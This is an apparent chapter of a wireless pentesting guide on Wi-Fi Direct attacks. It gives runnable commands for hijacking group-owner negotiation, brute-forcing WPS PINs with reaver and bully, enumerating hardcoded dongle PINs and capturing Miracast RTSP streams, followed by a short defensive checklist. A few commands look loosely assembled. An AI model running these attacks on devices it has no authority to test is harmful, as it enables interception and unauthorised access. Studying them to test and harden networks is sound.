# 10 - Wi-Fi Direct and P2P Attacks

## Overview

Wi-Fi Direct (Wi-Fi P2P, WFD) allows devices to connect directly without an AP. Used by Miracast, Android Beam, printer direct printing, and device-to-device file transfer. The attacker can exploit P2P group formation, WPS PIN, and session hijacking.

## P2P Discovery and Group Formation

```bash
# Scan for P2P devices
wpa_cli -i wlan0 p2p_find

# List discovered P2P peers
wpa_cli -i wlan0 p2p_peers

# P2P peer information
wpa_cli -i wlan0 p2p_peer <PEER_MAC>

# Group formation: GO (Group Owner) negotiation
wpa_cli -i wlan0 p2p_connect <PEER_MAC> pbc  # Push button
wpa_cli -i wlan0 p2p_connect <PEER_MAC> <PIN>  # PIN method
```

## Attack 1: P2P Group Owner Negotiation Hijacking

The GO (Group Owner) acts as a soft AP. The attacker manipulates GO Intent values to become GO and intercept all traffic.

```bash
# In wpa_supplicant.conf, set maximum GO Intent (15)
p2p_go_intent=15

# When connecting, the attacker always wins GO negotiation
# All traffic between peer and attacker goes through attacker's soft AP

# Monitor P2P action frames
airodump-ng wlan0mon --band abg | grep -i p2p
```

## Attack 2: WPS PIN via P2P

Most P2P devices support WPS PIN for group formation. Brute-force the PIN.

```bash
# Reaver on P2P interface
reaver -i wlan0 -b <P2P_DEVICE_MAC> -c 6 -vv -K 1

# Bully on P2P
bully -b <P2P_DEVICE_MAC> -c 6 -i wlan0 -v 3

# Pixie Dust on P2P WPS (many IoT P2P devices have weak RNG)
reaver -i wlan0 -b <P2P_DEVICE_MAC> -K 1 -vv
```

## Attack 3: Miracast Session Hijacking

Miracast uses Wi-Fi Direct for the control channel and a separate RTSP session for display streaming.

```bash
# 1. Discover Miracast sink (TV/dongle)
wpa_cli p2p_find
grep "Miracast" /tmp/p2p_peers

# 2. Force GO negotiation, become GO
# 3. Sink connects to attacker's soft AP
# 4. Intercept RTSP SETUP/PLAY messages
# 5. Inject forged frames into video stream

# Miracast uses port 7236 (RTSP) and 7250 (RTP)
# Capture with tcpdump
tcpdump -i p2p-wlan0-0 port 7236 or port 7250 -w miracast.pcap
```

## Attack 4: Wi-Fi Display (WFD) PIN Extraction

Many WFD dongles (Chromecast, Miracast dongles) use predictable or hardcoded WPS PINs.

```bash
# Common hardcoded PINs for display dongles:
# Anycast: 12345670, 00000000
# Chromecast: No PIN (uses DIAL protocol over mDNS instead)
# Miracast TVs: Often use PIN from on-screen display

# Enumerate PINs
for pin in 12345670 00000000 11111111; do
    wpa_cli p2p_connect <MAC> $pin
done
```

## Attack 5: P2P Persistent Group Abuse

P2P devices store persistent groups for faster reconnection. The attacker clones a persistent group.

```bash
# List persistent groups on a compromised device
wpa_cli -i wlan0 p2p_list_persistent

# Clone persistent group credentials
# The persistent group contains: SSID, passphrase, GO MAC
# Use these to create a clone AP that the victim auto-connects to
```

## Attack 6: Service Discovery Interception

P2P devices broadcast services via Bonjour/UPnP over P2P. Intercept and spoof service responses.

```bash
# Monitor P2P service discovery
wpa_cli -i wlan0 p2p_serv_disc_req <PEER_MAC> "upnp\*_\*\*\*\*"

# The response contains device capabilities, services, UUIDs
# Use UUID to identify device type and firmware version
```

## Wi-Fi Aware (Neighbor Awareness Networking)

Wi-Fi Aware (NAN) is the successor to P2P for device discovery. Devices publish and subscribe to "services" within range.

```bash
# Wi-Fi Aware requires Android 8+ with hardware support
# Limited tool support as of 2024

# Android API for NAN:
# WifiAwareManager.publish()
# WifiAwareManager.subscribe()

# Attack surface:
# - Spoof service advertisements
# - Man-in-the-middle on NAN data paths
# - DOS via service flooding
```

## Defensive Application

- **Disable Wi-Fi Direct**: On corporate devices, disable P2P in wpa_supplicant
- **WPS disable on P2P**: Reject all WPS PIN attempts on P2P interfaces
- **Persistent group cleanup**: Regularly delete persistent P2P groups
- **Miracast authentication**: Use HDCP + device pairing for Miracast sinks
- **Network isolation**: Prevent P2P interfaces from bridging to corporate network

## References

- Wi-Fi Alliance Wi-Fi Direct Specification
- Wi-Fi Alliance Wi-Fi Aware Specification
- CVE-2021-0326: Android P2P information disclosure
- CVE-2022-20137: MediaTek Wi-Fi Direct buffer overflow
